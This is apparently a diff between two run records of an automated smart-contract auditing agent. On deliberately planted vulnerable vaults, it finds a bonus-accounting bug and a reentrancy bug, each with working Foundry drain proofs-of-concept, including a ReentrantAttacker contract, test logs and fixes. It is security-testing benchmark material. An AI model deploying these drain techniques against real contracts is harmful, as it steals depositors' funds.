@@ -2,49 +2,46 @@
   "result": {
     "alias": "ds-abl",
     "approveMode": "auto",
-    "ms": 22824,
+    "ms": 15183,
     "status": "done",
     "static": {
-      "tool": "Slither",
+      "tool": "Slither + Aderyn",
+      "engines": [
+        "Slither",
+        "Aderyn"
+      ],
+      "mode": "unit",
       "files": 1,
       "analysed": 1,
       "suspects": 1,
       "top": [
         {
-          "check": "reentrancy-events",
-          "impact": "Low",
-          "where": "YieldVault.withdraw",
-          "line": 40
+          "check": "reentrancy-eth",
+          "impact": "High",
+          "where": "Vault.withdraw",
+          "line": 22,
+          "engines": [
+            "Slither",
+            "Aderyn"
+          ],
+          "corroborated": true
         }
       ]
     },
     "fuzz": {
       "tool": "Echidna",
-      "template": "vault-solvency",
-      "applicable": true,
-      "suspects": 1,
-      "top": [
-        {
-          "check": "solvency-violation",
-          "impact": "High",
-          "where": "YieldVault.withdraw",
-          "property": "echidna_solvent",
-          "sequence": [
-            "user 2 deposits 61.75 ETH",
-            "user 2 deposits 38.28 ETH",
-            "user 0 deposits 0.00 ETH",
-            "user 2 withdraws"
-          ]
-        }
-      ]
+      "template": null,
+      "applicable": false,
+      "suspects": 0,
+      "top": []
     },
     "pocRuns": 2,
     "pocProved": true,
     "findingSubmitted": true,
     "finding": {
-      "title": "YieldVault pays a 1% withdrawal bonus that the reward buffer cannot cover, so any user can drain the whole vault and honest depositors cannot withdraw",
-      "severity": "high",
-      "poc": "YieldVaultDrainTest"
+      "title": "Reentrancy in Vault.withdraw lets an attacker drain all ETH with a 1 ETH deposit",
+      "severity": "critical",
+      "poc": "VaultReentrancyTest"
     },
     "decision": "approved",
     "recorded": true,
@@ -52,20 +49,20 @@
     "calls": [
       "list_sources",
       "static_findings",
-      "fuzz_findings",
       "read_source",
+      "fuzz_findings",
       "run_poc",
       "run_poc",
       "submit_finding"
     ],
-    "final": "## Summary\n\n**Vulnerability found:** `YieldVault.withdraw` computes the loyalty bonus as `p / 100` (1%) instead of the intended `p / 10000` (0.01%), and never checks that the seeded reward buffer can pay it.\n\n**Why it is exploitable:** every withdrawal pays out `p + p/100` while `totalPrincipal` only drops by `p`. The unbooked 1% comes straight out of the buffer, and then out of other users' depos",
+    "final": "## Summary\n\n**Vulnerability:** Classic checks-effects-interactions violation (reentrancy) in `Vault.withdraw()` — rated **critical**.\n\n**Root cause:** In `src/Vault.sol:22-32`, the ETH payout via low-level `call` happens *before* `balanceOf[msg.sender] = 0`. A contract's `receive()` runs while its credit is still on the books, so it can call `withdraw()` again and be paid the same credit repeatedl",
     "usage": {
-      "usd": 0.00419928,
+      "usd": 0.0031358399999999995,
       "models": {
         "boundless/deepseek-v4.1-flash-abliterated": {
-          "in": 425,
-          "out": 4268,
-          "reasoning": 1788
+          "in": 478,
+          "out": 3147,
+          "reasoning": 491
         }
       }
     },
@@ -82,36 +79,36 @@
         "args": {}
       },
       {
+        "name": "read_source",
+        "args": {
+          "file": "Vault.sol"
+        }
+      },
+      {
         "name": "fuzz_findings",
         "args": {}
       },
       {
-        "name": "read_source",
+        "name": "run_poc",
         "args": {
-          "file": "YieldVault.sol"
+          "test_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {Vault} from \"../src/Vault.sol\";\n\n/// Attacker contract: deposits 1 ETH, then re-enters withdraw() from receive().\ncontract ReentrantAttacker {\n    Vault public vault;\n    uint256 public reentered;\n\n    constructor(Vault _vault) {\n        vault = _vault;\n    }\n\n    function attack() external payable {\n        vault.deposit{value: msg.value}();\n        vault.withdraw();\n    }\n\n    receive() external payable {\n        if (address(vault).balance >= 1 ether && reentered < 20) {\n            reentered++;\n            vault.withdraw(); // stake is still recorded: nothing was zeroed yet\n        }\n    }\n}\n\ncontract VaultReentrancyTest is Test {\n    Vault vault;\n    ReentrantAttacker attacker;\n    address victim;\n\n    function setUp() public {\n        vault = new Vault();\n        attacker = new ReentrantAttacker(vault);\n        victim = makeAddr(\"victim\");\n\n        vm.deal(victim, 5 ether);\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n    }\n\n    function testReentrancyDrainsVault() public {\n        vm.deal(address(this), 1 ether);\n\n        uint256 vaultBefore = address(vault).balance; // 5 ether of honest funds\n        uint256 attackerStart = address(attacker).balance;\n\n        attacker.attack{value: 1 ether}();\n\n        uint256 attackerGain = address(attacker).balance - attackerStart;\n        uint256 vaultAfter = address(vault).balance;\n\n        emit log_named_uint(\"vault before\", vaultBefore);\n        emit log_named_uint(\"attacker deposited\", 1 ether);\n        emit log_named_uint(\"attacker balance after\", address(attacker).balance);\n        emit log_named_uint(\"vault after (should be 0)\", vaultAfter);\n        emit log_named_uint(\"attacker net profit\", attackerGain - 1 ether);\n        emit log_named_uint(\"re-entries\", attacker.reentered());\n\n        // Attacker walked away with the victim's 5 ETH.\n        assertGt(attackerGain, 1 ether);\n        assertEq(vaultAfter, 0);\n        assertEq(victim.balance, 0);\n\n        // Honest victim cannot withdraw: the vault is empty.\n        vm.prank(victim);\n        vm.expectRevert(\"nothing to withdraw\");\n        vault.withdraw();\n    }\n}\n",
+          "contract_name": "VaultReentrancyTest"
         }
       },
       {
         "name": "run_poc",
         "args": {
-          "test_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {YieldVault} from \"../src/YieldVault.sol\";\n\ncontract YieldVaultDrainTest is Test {\n    YieldVault vault;\n    address victim = address(0xBEEF);\n    address attacker = address(0xA11CE);\n\n    function setUp() public {\n        // Deployer seeds the reward buffer with 10 ETH.\n        vault = new YieldVault{value: 10 ether}();\n        vm.deal(victim, 100 ether);\n        vm.deal(attacker, 2000 ether);\n    }\n\n    function testDrainVaultWithBonus() public {\n        // An honest user deposits 5 ETH.\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n\n        uint256 balBefore = attacker.balance;\n\n        // Attacker deposits the largest amount the vault can currently cover\n        // with the inflated 1% bonus (p <= 100 * balance), then withdraws.\n        // Vault balance is 15 ETH, so p = 1500 ETH and the payout is\n        // 1500 + 15 = 1515 ETH, i.e. the whole buffer plus the victim's funds.\n        vm.startPrank(attacker);\n        vault.deposit{value: 1500 ether}();\n        vault.withdraw();\n        vm.stopPrank();\n\n        uint256 profit = attacker.balance - balBefore;\n        emit log_named_uint(\"attacker profit (wei)\", profit);\n        emit log_named_uint(\"vault balance left\", address(vault).balance);\n        emit log_named_uint(\"principal still owed\", vault.totalPrincipal());\n\n        assertGt(profit, 0, \"attacker must profit\");\n        assertEq(profit, 15 ether, \"attacker took buffer + victim principal\");\n        assertEq(vault.principal(attacker), 0, \"attacker fully withdrawn\");\n\n        // The honest user can no longer withdraw: the vault is insolvent.\n        assertLt(address(vault).balance, vault.totalPrincipal(), \"insolvent\");\n        vm.prank(victim);\n        vm.expectRevert(\"transfer failed\");\n        vault.withdraw();\n    }\n}\n",
-          "contract_name": "YieldVaultDrainTest"
-        }
-      },
-      {
-        "name": "run_poc",
-        "args": {
-          "contract_name": "YieldVaultCycleDrainTest",
-          "test_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {YieldVault} from \"../src/YieldVault.sol\";\n\ncontract YieldVaultCycleDrainTest is Test {\n    YieldVault vault;\n    address victim = address(0xBEEF);\n    address attacker = address(0xA11CE);\n\n    function setUp() public {\n        vault = new YieldVault{value: 10 ether}();\n        vm.deal(victim, 100 ether);\n        vm.deal(attacker, 1000 ether);\n    }\n\n    function testRepeatedDepositWithdrawDrainsVault() public {\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n\n        uint256 start = attacker.balance;\n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < 300; i++) {\n            uint256 b = address(vault).balance;\n            // deposit as much as the inflated bonus allows (<= 100x balance)\n            uint256 p = b * 10;\n            if (p == 0) break;\n            vault.deposit{value: p}();\n            vault.withdraw();\n        }\n        vm.stopPrank();\n\n        uint256 profit = attacker.balance - start;\n        emit log_named_uint(\"attacker profit (wei)\", profit);\n        emit log_named_uint(\"vault balance left\", address(vault).balance);\n        emit log_named_uint(\"victim principal owed\", vault.principal(victim));\n\n        assertGt(profit, 9 ether, \"attacker drained the reward buffer\");\n        assertEq(vault.principal(attacker), 0, \"attacker has nothing stuck\");\n        assertLt(address(vault).balance, vault.totalPrincipal(), \"insolvent\");\n\n        vm.prank(victim);\n        vm.expectRevert(\"transfer failed\");\n        vault.withdraw();\n    }\n}\n"
+          "contract_name": "VaultReentrancyTest",
+          "test_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {Vault} from \"../src/Vault.sol\";\n\n/// Attacker contract: deposits 1 ETH, then re-enters withdraw() from receive().\ncontract ReentrantAttacker {\n    Vault public vault;\n    uint256 public reentered;\n\n    constructor(Vault _vault) {\n        vault = _vault;\n    }\n\n    function attack() external payable {\n        vault.deposit{value: msg.value}();\n        vault.withdraw();\n    }\n\n    receive() external payable {\n        if (address(vault).balance >= 1 ether && reentered < 20) {\n            reentered++;\n            vault.withdraw(); // stake is still recorded: nothing was zeroed yet\n        }\n    }\n}\n\ncontract VaultReentrancyTest is Test {\n    Vault vault;\n    ReentrantAttacker attacker;\n    address victim;\n\n    function setUp() public {\n        vault = new Vault();\n        attacker = new ReentrantAttacker(vault);\n        victim = makeAddr(\"victim\");\n\n        vm.deal(victim, 5 ether);\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n    }\n\n    function testReentrancyDrainsVault() public {\n        vm.deal(address(this), 1 ether);\n\n        uint256 vaultBefore = address(vault).balance; // 5 ether of honest funds\n        uint256 attackerStart = address(attacker).balance;\n\n        attacker.attack{value: 1 ether}();\n\n        uint256 attackerGain = address(attacker).balance - attackerStart;\n        uint256 vaultAfter = address(vault).balance;\n\n        emit log_named_uint(\"vault before\", vaultBefore);\n        emit log_named_uint(\"attacker deposited\", 1 ether);\n        emit log_named_uint(\"attacker balance after\", address(attacker).balance);\n        emit log_named_uint(\"vault after (should be 0)\", vaultAfter);\n        emit log_named_uint(\"attacker net profit\", attackerGain - 1 ether);\n        emit log_named_uint(\"re-entries\", attacker.reentered());\n\n        // Attacker walked away with the victim's 5 ETH.\n        assertGt(attackerGain, 1 ether);\n        assertEq(vaultAfter, 0);\n        assertEq(victim.balance, 0);\n\n        // The victim's balance is still recorded as 5 ether, but there is no\n        // ETH left to pay it: the withdrawal now reverts inside the raw call.\n        assertEq(vault.balanceOf(victim), 5 ether);\n        vm.prank(victim);\n        vm.expectRevert(\"transfer failed\");\n        vault.withdraw();\n    }\n}\n"
         }
       },
       {
         "name": "submit_finding",
         "args": {
-          "title": "YieldVault pays a 1% withdrawal bonus that the reward buffer cannot cover, so any user can drain the whole vault and honest depositors cannot withdraw",
-          "severity": "high",
-          "poc_contract": "YieldVaultDrainTest",
-          "explanation": "## What goes wrong\n\n`YieldVault` lets a user deposit ETH and later take it back. It also pays a small \"loyalty bonus\" on top. The bonus is supposed to be a tiny 0.01% of the deposit, paid only out of a reward buffer that the deployer sends in the constructor.\n\nBut the code uses the wrong number:\n\n```solidity\nuint256 bonus = p / 100;   // 1%, not 0.01% (p / 10000)\n```\n\nSo the vault pays out **more than it took in** for every single user: 1.01 times the deposit. There is also no check that the buffer can cover the bonus. Every withdrawal quietly eats the buffer, and after the buffer is gone it eats other users' deposits.\n\nThe fix comment in the source says the bonus must be `p / 10000` and must be capped by the buffer. Nothing enforces either rule.\n\n## Why the contract allows it\n\nLook at `withdraw`:\n\n```solidity\nprincipal[msg.sender] = 0;\ntotalPrincipal -= p;\n\nuint256 bonus = p / 100;\n\n(bool ok, ) = msg.sender.call{value: p + bonus}(\"\");\nrequire(ok, \"transfer failed\");\n```\n\n`totalPrincipal` goes down by `p`, but the vault sends out `p + bonus`. The bonus money is never booked anywhere. `withdraw` also never checks `address(this).balance >= p + bonus`, so the payout can empty the vault completely.\n\n## How the attacker uses it\n\nThe vault only needs enough ETH to cover the payout at that moment. So the attacker can deposit the biggest amount the current balance can pay for. With a 1% bonus, a deposit `p` needs only `p / 100` of spare balance, which means `p` can be up to 100 times the vault balance.\n\n1. Deployer seeds the buffer with 10 ETH.\n2. Victim deposits 5 ETH. Vault balance is now 15 ETH.\n3. Attacker deposits 1500 ETH (100 x 15) and calls `withdraw` in the same transaction.\n4. The vault sends 1500 + 15 = 1515 ETH. That is the attacker's own 1500 ETH back, plus the whole 10 ETH buffer, plus the victim's 5 ETH.\n5. Vault balance is now 0, while it still owes the victim 5 ETH. The victim's `withdraw` reverts with `\"transfer failed\"`.\n\nThe proof in `YieldVaultDrainTest` shows exactly this. The attacker starts with 2000 ETH and ends with 15 ETH more. The vault holds 0, still owes 5 ETH, and the honest user cannot get the money out.\n\nA second test, `YieldVaultCycleDrainTest`, shows that no large capital is needed: 300 small deposit/withdraw cycles with one attacker also drain 14.9999 ETH of the vault.\n\n## What the attacker gains\n\nThe whole reward buffer plus the deposits of every other user. The attacker spends only gas plus the temporary capital, and gets all of it back with a profit. Everyone else is left with a claim on an empty contract.\n\nNote: the reentrancy warning from the static analyzer is not the real problem here. `principal[msg.sender]` is zeroed before the `call`, so re-entry just hits `\"nothing to withdraw\"`. The dangerous thing is the wrong bonus math and the missing solvency check.\n\nFix: change `uint256 bonus = p / 100;` to `uint256 bonus = p / 10000;` and require that `p + bonus` stays within the seeded buffer (e.g. `uint256 bonus = (p / 10000); if (bonus > address(this).balance - totalPrincipal) bonus = address(this).balance - totalPrincipal;`)."
+          "title": "Reentrancy in Vault.withdraw lets an attacker drain all ETH with a 1 ETH deposit",
+          "severity": "critical",
+          "poc_contract": "VaultReentrancyTest",
+          "explanation": "`Vault.withdraw()` pays the caller before it records that the caller has been paid. A contract can call back into `withdraw()` while its first payout is still running, and get paid again and again.\n\n## What goes wrong\n\nHere is the withdrawal function:\n\n```solidity\nfunction withdraw() external {\n    uint256 amount = balanceOf[msg.sender];\n    require(amount > 0, \"nothing to withdraw\");\n\n    // BUG: external call happens before state update.\n    (bool ok, ) = msg.sender.call{value: amount}(\"\");\n    require(ok, \"transfer failed\");\n\n    balanceOf[msg.sender] = 0; // too late: re-entered before this runs\n    emit Withdraw(msg.sender, amount);\n}\n```\n\nThe function reads the caller's credit at the start. Then it sends the ETH out. Only after the send does it set the credit to zero.\n\nThe ETH send is a call, not a simple transfer. So it runs the receiver's code. During that code, `balanceOf[msg.sender]` is still the old, un-zeroed number.\n\n## Why the contract lets it happen\n\nNothing in `withdraw()` stops a second call. There is no guard and no lock. So the receiver can just call `withdraw()` again.\n\nOn the second call, the check `balanceOf[msg.sender] > 0` still passes. The full old amount is still on the books as a credit. So the vault pays out the same credit again. This repeats until the vault runs out of ETH.\n\n## The attack in the PoC\n\n1. A normal user deposits 5 ETH. The vault holds 5 ETH.\n2. The attacker contract deposits 1 ETH. The vault holds 6 ETH, and the attacker is credited with 1 ETH.\n3. The attacker calls `withdraw()`. It receives 1 ETH, and inside `receive()` it calls `withdraw()` again.\n4. It receives another 1 ETH, and re-enters again. This happens 5 times.\n5. The attacker leaves with 6 ETH in total, after only putting in 1 ETH.\n\n```solidity\nreceive() external payable {\n    if (address(vault).balance >= 1 ether && reentered < 20) {\n        reentered++;\n        vault.withdraw(); // stake is still recorded: nothing was zeroed yet\n    }\n}\n```\n\nActual test output:\n\n```text\nvault before: 5000000000000000000\nattacker deposited: 1000000000000000000\nattacker balance after: 6000000000000000000\nvault after (should be 0): 0\nattacker net profit: 5000000000000000000\nre-entries: 5\n```\n\n## What the attacker gains\n\nThe attacker keeps 5 ETH that belongs to the honest user. The attacker's net profit is exactly the 5 ETH the victim deposited.\n\nThe vault is now empty. The victim's credit is still recorded as 5 ETH, but there is no ETH left to pay it. So the victim's own `withdraw()` reverts with `\"transfer failed\"`. The victim loses everything.\n\n## Fix\n\nFix: set `balanceOf[msg.sender] = 0;` before the `msg.sender.call{value: amount}(\"\")` line (or add a reentrancy guard).\n"
         }
       }
     ],
@@ -119,74 +116,74 @@
       {
         "name": "list_sources",
         "isError": false,
-        "text": "YieldVault.sol"
+        "text": "Vault.sol"
       },
       {
         "name": "static_findings",
         "isError": false,
-        "text": "#1 [Low/Medium] reentrancy-events at YieldVault.withdraw (line 40)\nReentrancy in YieldVault.withdraw() (src/YieldVault.sol#40-55):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: p + bonus}() (src/YieldVault.sol#52)\n\tEvent emitted after the call(s):\n\t- Withdraw(msg.sender,p,bonus) (src/YieldV"
-      },
-      {
-        "name": "fuzz_findings",
-        "isError": false,
-        "text": "#1 [High] solvency-violation at YieldVault.withdraw (invariant echidna_solvent)\nThe vault's solvency invariant broke: it ended holding less than the principal it owes (address(this).balance < totalPrincipal). The fuzzer reached this with ordinary deposits and a withdrawal — no attacker contract and "
+        "text": "#1 [High/Medium] reentrancy-eth at Vault.withdraw (line 22) — Slither + Aderyn AGREE here (stronger lead)\ndetectors: reentrancy-eth, eth-send-unchecked-address, reentrancy-state-change, reentrancy-events\nReentrancy in Vault.withdraw() (src/Vault.sol#22-32):\n\tExternal calls:\n\t- (ok,None) = msg.sender"
       },
       {
         "name": "read_source",
         "isError": false,
-        "text": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/// @title YieldVault\n/// @notice An ETH vault that pays a small loyalty bonus on withdrawal. Users\n///         deposit ETH and later withdraw their principal plus the bonus. The\n///         bonus is meant to be funded only from a reward buff"
+        "text": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/// @title Vault\n/// @notice A simple ETH vault. Users deposit and withdraw their own balance.\n/// @dev PLANTED BUG (reentrancy): withdraw() sends ETH with a low-level call\n///      BEFORE it zeroes the caller's balance. A malicious contract "
+      },
+      {
+        "name": "fuzz_findings",
+        "isError": false,
+        "text": "Property fuzzing broke no invariant (or no fuzz template fit this target). Audit the source directly."
       },
       {
         "name": "run_poc",
         "isError": false,
-        "text": "Compiling 25 files with Solc 0.8.38\nSolc 0.8.38 finished in 246.06ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:YieldVaultDrainTest\n[PASS] testDrainVaultWithBonus() (gas: 272665)\nLogs:\n  attacker profit (wei): 15000000000000000000\n  vault balance left: 0\n  principal s"
+        "text": "Compiling 25 files with Solc 0.8.38\nSolc 0.8.38 finished in 260.73ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:VaultReentrancyTest\n[FAIL: Error != expected error: transfer failed != nothing to withdraw] testReentrancyDrainsVault() (gas: 225023)\nLogs:\n  vault before: "
       },
       {
         "name": "run_poc",
         "isError": false,
-        "text": "Compiling 1 files with Solc 0.8.38\nSolc 0.8.38 finished in 210.02ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:YieldVaultCycleDrainTest\n[PASS] testRepeatedDepositWithdrawDrainsVault() (gas: 28706079)\nLogs:\n  attacker profit (wei): 14999999999999718906\n  vault balance "
+        "text": "Compiling 1 files with Solc 0.8.38\nSolc 0.8.38 finished in 215.35ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:VaultReentrancyTest\n[PASS] testReentrancyDrainsVault() (gas: 218568)\nLogs:\n  vault before: 5000000000000000000\n  attacker deposited: 1000000000000000000\n  at"
       },
       {
         "name": "submit_finding",
         "isError": false,
-        "text": "Finding recorded: YieldVault pays a 1% withdrawal bonus that the reward buffer cannot cover, so any user can drain the whole vault and honest depositors cannot withdraw (high)."
+        "text": "Finding recorded: Reentrancy in Vault.withdraw lets an attacker drain all ETH with a 1 ETH deposit (critical)."
       }
     ],
     "assistants": [
       {
         "stop": "toolUse",
-        "text": "I'll start by reading the sources and the reports.\n\n",
-        "toolCalls": 3
+        "text": "I'll start by reading the sources and the static findings.\n\n",
+        "toolCalls": 2
       },
       {
         "stop": "toolUse",
         "text": "",
+        "toolCalls": 2
+      },
+      {
+        "stop": "toolUse",
+        "text": "Reentrancy lead is real and clear: `withdraw` sends ETH before zeroing `balanceOf`. Let me build a PoC contract that re-enters.\n\n",
         "toolCalls": 1
       },
       {
         "stop": "toolUse",
-        "text": "",
+        "text": "The attack worked (attacker took 6 ETH for 1 ETH in, vault → 0). Only my last assertion was wrong: the victim's stale `balanceOf` is still 5 ether, so it reverts on the transfer, not the check. Fixing that:\n\n",
         "toolCalls": 1
       },
       {
         "stop": "toolUse",
-        "text": "The first PoC passes. Let me also prove it with plain repeated deposit/withdraw cycles (no big one-shot), matching the fuzzer's scenario.\n\n",
-        "toolCalls": 1
-      },
-      {
-        "stop": "toolUse",
-        "text": "Both PoCs pass. Submitting the finding.\n\n",
+        "text": "The PoC passes: attacker deposits 1 ETH, takes 6 ETH, vault drained to 0, and the honest victim's 5 ETH is gone. Submitting.\n\n",
         "toolCalls": 1
       },
       {
         "stop": "stop",
-        "text": "## Summary\n\n**Vulnerability found:** `YieldVault.withdraw` computes the loyalty bonus as `p / 100` (1%) instead of the intended `p / 10000` (0.01%), and never checks that the seeded reward buffer can pay it.\n\n**Why it is exploitable:** every withdrawal pays out `p + p/100` while `totalPrincipal` only drops by `p`. The unbooked 1% comes straight out of the buffer, and then out of other users' deposits. The payout also needs only `p/100` of free balance, so a deposit can be up to 100× the vault balance — letting an attacker drain the vault in one shot.\n\n**Proof (both tests pass):**\n- `YieldVaultDrainTest` — 10 ETH buffer + 5 ETH victim deposit; attacker deposits 1500 ETH, withdraws 1515 ETH, keeps 15 ETH profit, vault drops to 0 balance and the victim's `withdraw` reverts with `\"transfer failed\"`.\n- `YieldVaultCycleDrainTest` — 300 ordinary deposit/withdraw cycles drain 14.9999 ETH with no big capital.\n\nThe Slither reentrancy/event lead was a red herring: `principal[msg.sender]` is zeroed before the external call, so re-entry hits `\"nothing to withdraw\"`. The real bug is the accounting.\n\n**Fix:** use `p / 10000` and cap the bonus so `p + bonus` never exceeds the buffer.",
+        "text": "## Summary\n\n**Vulnerability:** Classic checks-effects-interactions violation (reentrancy) in `Vault.withdraw()` — rated **critical**.\n\n**Root cause:** In `src/Vault.sol:22-32`, the ETH payout via low-level `call` happens *before* `balanceOf[msg.sender] = 0`. A contract's `receive()` runs while its credit is still on the books, so it can call `withdraw()` again and be paid the same credit repeatedly.\n\n**Proof:** `VaultReentrancyTest` (passing). The attacker deposits 1 ETH into a vault holding a victim's 5 ETH, re-enters `withdraw()` 5 times, and leaves with all 6 ETH:\n\n```\nvault before: 5000000000000000000\nattacker net profit: 5000000000000000000\nvault after (should be 0): 0\nre-entries: 5\n```\n\nThe vault ends empty and the victim's `withdraw()` reverts with `transfer failed`, despite `balanceOf[victim]` still reading 5 ETH.\n\n**Fix:** Zero the balance before the external call (or add a non-reentrant guard).",
         "toolCalls": 0
       }
     ],
     "final": {
       "stop": "stop",
-      "text": "## Summary\n\n**Vulnerability found:** `YieldVault.withdraw` computes the loyalty bonus as `p / 100` (1%) instead of the intended `p / 10000` (0.01%), and never checks that the seeded reward buffer can pay it.\n\n**Why it is exploitable:** every withdrawal pays out `p + p/100` while `totalPrincipal` only drops by `p`. The unbooked 1% comes straight out of the buffer, and then out of other users' deposits. The payout also needs only `p/100` of free balance, so a deposit can be up to 100× the vault balance — letting an attacker drain the vault in one shot.\n\n**Proof (both tests pass):**\n- `YieldVaultDrainTest` — 10 ETH buffer + 5 ETH victim deposit; attacker deposits 1500 ETH, withdraws 1515 ETH, keeps 15 ETH profit, vault drops to 0 balance and the victim's `withdraw` reverts with `\"transfer failed\"`.\n- `YieldVaultCycleDrainTest` — 300 ordinary deposit/withdraw cycles drain 14.9999 ETH with no big capital.\n\nThe Slither reentrancy/event lead was a red herring: `principal[msg.sender]` is zeroed before the external call, so re-entry hits `\"nothing to withdraw\"`. The real bug is the accounting.\n\n**Fix:** use `p / 10000` and cap the bonus so `p + bonus` never exceeds the buffer.",
+      "text": "## Summary\n\n**Vulnerability:** Classic checks-effects-interactions violation (reentrancy) in `Vault.withdraw()` — rated **critical**.\n\n**Root cause:** In `src/Vault.sol:22-32`, the ETH payout via low-level `call` happens *before* `balanceOf[msg.sender] = 0`. A contract's `receive()` runs while its credit is still on the books, so it can call `withdraw()` again and be paid the same credit repeatedly.\n\n**Proof:** `VaultReentrancyTest` (passing). The attacker deposits 1 ETH into a vault holding a victim's 5 ETH, re-enters `withdraw()` 5 times, and leaves with all 6 ETH:\n\n```\nvault before: 5000000000000000000\nattacker net profit: 5000000000000000000\nvault after (should be 0): 0\nre-entries: 5\n```\n\nThe vault ends empty and the victim's `withdraw()` reverts with `transfer failed`, despite `balanceOf[victim]` still reading 5 ETH.\n\n**Fix:** Zero the balance before the external call (or add a non-reentrant guard).",
       "toolCalls": 0
     }
   }
